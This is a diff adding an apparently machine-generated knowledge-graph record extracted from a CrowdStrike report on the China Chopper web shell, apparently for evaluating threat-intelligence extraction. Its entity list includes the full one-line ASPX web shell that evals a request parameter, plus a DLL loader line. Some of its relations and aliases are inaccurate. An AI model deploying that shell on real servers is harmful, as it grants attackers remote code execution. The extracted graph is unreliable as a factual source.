@@ -1,0 +1,549 @@
+{
+  "sample_id": "malkg__201503CrowdStrikeChinaChopper.txt",
+  "sample_index": 144,
+  "source": "malkg",
+  "file_name": "201503CrowdStrikeChinaChopper.txt",
+  "method_name": "GRID_Ours (End2End)",
+  "method_file": "GRID_Ours.py",
+  "approach_instance_key": "GRID_two_steps_v2__764c1ab0c67006a2",
+  "generation": {
+    "status": "success",
+    "wall_seconds": 12.144203727025104,
+    "attempt_count": 1,
+    "model": "local",
+    "backend_type": "shared_vllm",
+    "token": 32768,
+    "temperature": 0.7
+  },
+  "parser": {
+    "name": "method_internal_parser",
+    "success": true
+  },
+  "generated_graph": {
+    "entities": [
+      {
+        "name": "Chopper Web shell",
+        "type": "malware",
+        "alias": [
+          "the Chopper Web shell",
+          "the Chopper Web shell client",
+          "Web shell variant",
+          "Web shell",
+          "Chopper",
+          "Chopper Web shell client",
+          "Chopper shell",
+          "Chopper shell variant",
+          "the Chopper Web shell client communicates over TCP"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "Chinese and other malicious actors",
+        "type": "threat-actor-or-intrusion-set",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "ASPX page",
+        "type": "file",
+        "alias": [
+          "any ASPX page",
+          "any ASP page",
+          "ASPX pages"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "single line",
+        "type": "file",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"password\"],\"unsafe\");%>",
+        "type": "file",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "CrowdStrike",
+        "type": "identity",
+        "alias": [
+          "we",
+          "our"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "IIS servers",
+        "type": "infrastructure",
+        "alias": [
+          "servers"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "trojanized DLL file",
+        "type": "file",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "System.WebServices.dll",
+        "type": "file",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "C#",
+        "type": "general-software",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "Chopper API functions",
+        "type": "hacker-tool",
+        "alias": [
+          "API functions"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "<% WebServices.InitalizeWebServices (\"shell_password\");%>",
+        "type": "file",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "Chopper client side binary",
+        "type": "hacker-tool",
+        "alias": [
+          "the Chopper client side binary",
+          "Chopper client",
+          "Chopper client side binary"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "host-based detection methods",
+        "type": "security-product",
+        "alias": [
+          "detection methods"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "suspicious functions such as ‘eval’",
+        "type": "general-software",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "TCP",
+        "type": "generic-noun",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "HTTP POST requests",
+        "type": "network-traffic",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "ChopShop",
+        "type": "course-of-action",
+        "alias": [
+          "the ChopShop framework",
+          "ChopShop framework"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "MITRE",
+        "type": "identity",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "privatekeyrsa.key",
+        "type": "file",
+        "alias": [
+          "the server’s private key"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "webshell_chopper_decode",
+        "type": "hacker-tool",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "ChopLib 4.0",
+        "type": "general-software",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "chopper_traffic_ssl.pcap",
+        "type": "file",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "chopper_traffic_http.pcap",
+        "type": "file",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "HTTP traffic",
+        "type": "network-traffic",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "chopper commands",
+        "type": "abstract-concept",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "chopper responses",
+        "type": "abstract-concept",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "base64 or hex",
+        "type": "abstract-concept",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "w3wp.exe",
+        "type": "file",
+        "alias": [
+          "renamed version of cmd.exe"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "mimikatz",
+        "type": "malware",
+        "alias": [
+          "pwd.txt"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "PE files",
+        "type": "file",
+        "alias": [
+          "Portable executable (PE) ﬁles"
+        ],
+        "mother entity": []
+      },
+      {
+        "name": "chopper_extracted_file-1.bin",
+        "type": "file",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "base64",
+        "type": "abstract-concept",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "hex",
+        "type": "abstract-concept",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "https://github.com/CrowdStrike/chopshop",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "https://github.com/MITRECND/chopshop",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "https://github.com/MITRECND/htpy",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "http://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/decrypting-ssl-withchopshop",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "https://www.ﬁreeye.com/content/dam/legacy/resources/pdfs/ﬁreeye-china-chopper-report.pdf",
+        "type": "malware-analysis-document-or-publication-or-conference",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "http://informationonsecurity.blogspot.com/2012/11/china-chopper-webshell.html",
+        "type": "url",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "@mediaﬁshy",
+        "type": "identity",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "@Shawn365Henry",
+        "type": "identity",
+        "alias": [],
+        "mother entity": []
+      },
+      {
+        "name": "@EricOpdyke",
+        "type": "identity",
+        "alias": [],
+        "mother entity": []
+      }
+    ],
+    "relations": [
+      {
+        "sub": "Chinese and other malicious actors",
+        "rel": "uses",
+        "rel_type": [
+          "targets"
+        ],
+        "obj": "Chopper Web shell"
+      },
+      {
+        "sub": "Chopper Web shell",
+        "rel": "is deployed into",
+        "rel_type": [
+          "drops"
+        ],
+        "obj": "ASPX page"
+      },
+      {
+        "sub": "single line",
+        "rel": "is a variant of",
+        "rel_type": [
+          "variant-of"
+        ],
+        "obj": "Chopper Web shell"
+      },
+      {
+        "sub": "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"password\"],\"unsafe\");%>",
+        "rel": "executes",
+        "rel_type": [
+          "executes"
+        ],
+        "obj": "Chopper Web shell"
+      },
+      {
+        "sub": "CrowdStrike",
+        "rel": "observes",
+        "rel_type": [
+          "malicious-investigates-track-detects"
+        ],
+        "obj": "Chopper Web shell"
+      },
+      {
+        "sub": "attackers",
+        "rel": "upload",
+        "rel_type": [
+          "drops"
+        ],
+        "obj": "trojanized DLL file"
+      },
+      {
+        "sub": "trojanized DLL file",
+        "rel": "is named",
+        "rel_type": [
+          "alias-of"
+        ],
+        "obj": "System.WebServices.dll"
+      },
+      {
+        "sub": "System.WebServices.dll",
+        "rel": "is written in",
+        "rel_type": [
+          "consists-of"
+        ],
+        "obj": "C#"
+      },
+      {
+        "sub": "System.WebServices.dll",
+        "rel": "contains",
+        "rel_type": [
+          "consists-of"
+        ],
+        "obj": "Chopper API functions"
+      },
+      {
+        "sub": "attackers",
+        "rel": "call",
+        "rel_type": [
+          "executes"
+        ],
+        "obj": "Chopper API functions"
+      },
+      {
+        "sub": "Chopper client side binary",
+        "rel": "accesses",
+        "rel_type": [
+          "uses"
+        ],
+        "obj": "Chopper Web shell"
+      },
+      {
+        "sub": "Chopper Web shell",
+        "rel": "evades",
+        "rel_type": [
+          "bypasses"
+        ],
+        "obj": "host-based detection methods"
+      },
+      {
+        "sub": "Chopper Web shell",
+        "rel": "evades detection via",
+        "rel_type": [
+          "bypasses"
+        ],
+        "obj": "suspicious functions such as ‘eval’"
+      },
+      {
+        "sub": "Chopper Web shell client",
+        "rel": "communicates over",
+        "rel_type": [
+          "communicates-with"
+        ],
+        "obj": "TCP"
+      },
+      {
+        "sub": "Chopper Web shell client",
+        "rel": "uses",
+        "rel_type": [
+          "uses"
+        ],
+        "obj": "HTTP POST requests"
+      },
+      {
+        "sub": "ChopShop",
+        "rel": "is developed by",
+        "rel_type": [
+          "authored-by"
+        ],
+        "obj": "MITRE"
+      },
+      {
+        "sub": "ChopShop",
+        "rel": "is extendable with",
+        "rel_type": [
+          "provides"
+        ],
+        "obj": "modules"
+      },
+      {
+        "sub": "webshell_chopper_decode",
+        "rel": "requires",
+        "rel_type": [
+          "depends-on"
+        ],
+        "obj": "ChopLib 4.0"
+      },
+      {
+        "sub": "webshell_chopper_decode",
+        "rel": "decodes",
+        "rel_type": [
+          "analyzes"
+        ],
+        "obj": "HTTP traffic"
+      },
+      {
+        "sub": "webshell_chopper_decode",
+        "rel": "uses",
+        "rel_type": [
+          "uses"
+        ],
+        "obj": "privatekeyrsa.key"
+      },
+      {
+        "sub": "webshell_chopper_decode",
+        "rel": "extracts",
+        "rel_type": [
+          "extracts"
+        ],
+        "obj": "PE files",
+        "special_factuality": [
+          "possible"
+        ]
+      },
+      {
+        "sub": "mimikatz",
+        "rel": "is executed",
+        "rel_type": [
+          "executes"
+        ],
+        "obj": "Chopper Web shell",
+        "special_factuality": [
+          "possible"
+        ]
+      },
+      {
+        "sub": "w3wp.exe",
+        "rel": "is a renamed version of",
+        "rel_type": [
+          "alias-of"
+        ],
+        "obj": "cmd.exe"
+      },
+      {
+        "sub": "Chopper Web shell",
+        "rel": "uses",
+        "rel_type": [
+          "uses"
+        ],
+        "obj": "PE files"
+      },
+      {
+        "sub": "webshell_chopper_decode",
+        "rel": "outputs",
+        "rel_type": [
+          "other"
+        ],
+        "obj": "chopper commands"
+      },
+      {
+        "sub": "webshell_chopper_decode",
+        "rel": "outputs",
+        "rel_type": [
+          "other"
+        ],
+        "obj": "chopper responses"
+      },
+      {
+        "sub": "webshell_chopper_decode",
+        "rel": "extracts",
+        "rel_type": [
+          "extracts"
+        ],
+        "obj": "chopper_extracted_file-1.bin",
+        "special_factuality": [
+          "possible"
+        ]
+      }
+    ]
+  }
+}
